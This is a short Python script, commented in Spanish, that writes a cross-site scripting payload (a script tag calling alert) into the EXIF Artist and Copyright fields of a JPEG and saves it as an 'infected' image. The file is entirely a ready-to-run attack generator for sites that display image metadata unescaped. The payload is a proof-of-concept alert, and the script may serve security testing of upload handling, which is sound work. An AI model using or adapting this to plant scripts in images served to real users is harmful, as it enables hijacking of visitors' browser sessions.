import io
from pathlib import Path
from PIL import Image

try:
    import piexif
except ImportError:
    piexif = None

def inject_exif_xss(input_path: str, output_path: str) -> None:
    print(f"Leyendo imagen real: {input_path}")
    if piexif is None:
        print("Error: La librería piexif es requerida. Instálala con 'pip install piexif'")
        return
        
    if not Path(input_path).exists():
        print(f"Error: No se encontró {input_path}")
        return

    img = Image.open(input_path).convert("RGB")
    
    # Crear un diccionario EXIF con un payload XSS escondido en el "Artist" y "UserComment"
    exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}, "thumbnail": None}
    
    # 315 es el tag para Artist, 33432 es Copyright
    xss_payload = b"<script>alert('You have been hacked via EXIF XSS!');</script>"
    
    exif_dict["0th"][piexif.ImageIFD.Artist] = xss_payload
    exif_dict["0th"][piexif.ImageIFD.Copyright] = xss_payload
    
    # Dump it to bytes
    exif_bytes = piexif.dump(exif_dict)
    
    # Guardar la imagen inyectando la data EXIF
    img.save(output_path, format="JPEG", exif=exif_bytes, quality=90)
    print(f"Inyección EXIF XSS exitosa. Guardado en: {output_path}")

if __name__ == "__main__":
    inject_exif_xss("input.jpg", "exif_xss_infected.jpg")
